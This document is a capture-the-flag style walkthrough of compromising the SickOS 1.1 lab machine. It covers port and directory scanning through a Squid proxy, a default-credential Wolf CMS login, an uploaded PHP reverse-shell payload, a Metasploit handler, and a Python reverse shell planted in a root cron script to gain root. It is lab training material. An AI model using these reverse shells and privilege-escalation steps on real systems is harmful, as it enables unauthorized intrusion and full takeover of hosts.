### slickOs 1.1

## 1. Emmu

Netscan
```
nmap -sn 192.168.174.0/24
Starting Nmap 7.01 ( https://nmap.org ) at 2016-01-04 15:59 CET
MAC Address: 00:50:56:C0:00:01 (VMware)
Nmap scan report for 192.168.174.133
Host is up (0.00013s latency).
```

Portscan Vic
```
nmap -sS -A -PN -p- -T5 192.168.174.133

Starting Nmap 7.01 ( https://nmap.org ) at 2016-01-04 16:00 CET
Nmap scan report for 192.168.174.133
Host is up (0.00029s latency).
Not shown: 65532 filtered ports
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)
|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)
|_  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)
3128/tcp open   http-proxy Squid http proxy 3.1.19
|_http-server-header: squid/3.1.19
|_http-title: ERROR: The requested URL could not be retrieved
8080/tcp closed http-proxy
MAC Address: 00:0C:29:96:94:71 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.0
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.29 ms 192.168.174.133

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.39 seconds
```


No HTTP open, but we can use the proxy
```
curl -v 192.168.174.133 --proxy 192.168.174.133:3128
* Rebuilt URL to: 192.168.174.133/
* Hostname was NOT found in DNS cache
*   Trying 192.168.174.133...
* Connected to 192.168.174.133 (192.168.174.133) port 3128 (#0)
> GET HTTP://192.168.174.133/ HTTP/1.1
> User-Agent: curl/7.38.0
> Host: 192.168.174.133
> Accept: */*
> Proxy-Connection: Keep-Alive
> 
* HTTP 1.0, assume close after body
< HTTP/1.0 200 OK
< Date: Mon, 04 Jan 2016 16:24:44 GMT
< Server: Apache/2.2.22 (Ubuntu)
< X-Powered-By: PHP/5.3.10-1ubuntu3.21
< Vary: Accept-Encoding
< Content-Length: 21
< Content-Type: text/html
< X-Cache: MISS from localhost
< X-Cache-Lookup: MISS from localhost:3128
< Via: 1.0 localhost (squid/3.1.19)
* HTTP/1.0 connection set to keep alive!
< Connection: keep-alive
< 
<h1>
BLEHHH!!!
</h1>
```
nothing here :(


Dir-Scan
```
dirb http://192.168.174.133 /usr/share/wordlists/dirb/big.txt -p 192.168.174.133:3128

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Jan  4 16:39:14 2016
URL_BASE: http://192.168.174.133/
WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt
PROXY: 192.168.174.133:3128

-----------------

GENERATED WORDS: 20458                                                         

---- Scanning URL: http://192.168.174.133/ ----
+ http://192.168.174.133/cgi-bin/ (CODE:403|SIZE:291)                                                                                                                                                       
+ http://192.168.174.133/connect (CODE:200|SIZE:109)                                                                                                                                                        
+ http://192.168.174.133/index (CODE:200|SIZE:21)                                                                                                                                                           
+ http://192.168.174.133/robots (CODE:200|SIZE:45)                                                                                                                                                          
+ http://192.168.174.133/robots.txt (CODE:200|SIZE:45)                                                                                                                                                      
+ http://192.168.174.133/server-status (CODE:403|SIZE:296)                                                                                                                                                  
                                                                                                                                                                                                            
```

Check robots.txt
```
curl -v 192.168.174.133/robots.txt --proxy 192.168.174.133:3128

User-agent: *
Disallow: /
Dissalow: /wolfcms
-----------------
```


Some searching about wolfcms -> admin-Login (tried some common combinations)
```
http://192.168.174.133/wolfcms/?/admin/login
admin:admin
```

Files -> Upload (msfvenom-php-shell)
```php
<?php error_reporting(0); $ip = '192.168.174.132'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } elseif (($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } elseif (($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } else { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; eval($b); die();
```
Uploaded file -> http://192.168.174.133/wolfcms/?/admin/plugin/file_manager/view/connect.php


Start a Msf-Listener
```
msf > use exploit/multi/handler 
msf exploit(handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 192.168.174.132
lhost => 192.168.174.132
msf exploit(handler) > run

[*] Started reverse handler on 192.168.174.132:4444 
[*] Starting the payload handler...
[*] Sending stage (33068 bytes) to 192.168.174.133
[*] Meterpreter session 1 opened (192.168.174.132:4444 -> 192.168.174.133:40397) at 2016-01-05 09:16:18 +0100

meterpreter > getuid 
Server username: www-data (33)
```


some research on host
```
cat /etc/cron.d/automate
* * * * * root /usr/bin/python /var/www/connect.py

ls -lah /var/www/connect.py
-rwxrwxrwx  1 root     root       77 Jan  5 15:26 connect.py
```

edit cronjob with python reverse-shell
```
meterpreter > edit connect.py

#!/usr/bin/python

import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.174.132",9999))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])

```


open reverse-listener and wait for cronjob
```
root@kali:~/Desktop# nc -lvp 9999
listening on [any] 9999 ...
192.168.174.133: inverse host lookup failed: Unknown host
connect to [192.168.174.132] from (UNKNOWN) [192.168.174.133] 39044
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)

# cd /root
# ls -lah
total 40K
drwx------  3 root root 4.0K Dec  6 21:14 .
drwxr-xr-x 22 root root 4.0K Sep 22 08:13 ..
-rw-r--r--  1 root root   96 Dec  6 07:27 a0216ea4d51874464078c618298b1367.txt
-rw-------  1 root root 3.7K Dec  6 21:18 .bash_history
-rw-r--r--  1 root root 3.1K Apr 19  2012 .bashrc
drwx------  2 root root 4.0K Sep 22 08:33 .cache
-rw-------  1 root root   22 Dec  5 06:24 .mysql_history
-rw-r--r--  1 root root  140 Apr 19  2012 .profile
-rw-------  1 root root 5.2K Dec  6 21:14 .viminfo
# cat a*
If you are viewing this!!

ROOT!

You have Succesfully completed SickOS1.1.
Thanks for Trying
```


got it :)
